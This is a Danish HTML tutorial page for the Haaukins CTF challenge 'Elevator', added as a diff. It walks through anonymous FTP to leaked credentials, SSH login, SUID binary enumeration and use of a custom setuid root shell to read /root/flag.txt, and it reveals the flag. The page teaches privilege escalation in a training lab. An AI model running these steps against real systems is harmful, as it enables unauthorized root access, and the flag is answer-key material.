@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Elevator — tutorial (custom SUID root-shell)</title>
+<meta name="description" content="Guide til Haaukins Elevator: anonym FTP → SSH → en indbygget SUID root-shell binær giver direkte root.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Elevator</h1>
+<p class="subtitle">FTP-anon → SSH → en indbygget SUID root-shell.</p>
+<div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>ftp anonymous@elevator.hkn            # credentials.txt (pablo:w0rk2bgr8)
+ssh pablo@elevator.hkn
+find / -perm -4000 -type f 2>/dev/null    # /usr/bin/rootshell/shell (custom)
+strings .../shell                     # setuid(0); system("/bin/bash")
+echo 'cat /root/flag.txt' | /usr/bin/rootshell/shell</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{p14t4_0_p10m0}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Samme foothold-mønster som <a href="escalator.html">Escalator</a>, men privesc = en bevidst SUID root-shell.</li><li><code>setuid(0); system()</code> kører <code>/bin/bash</code> som root.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
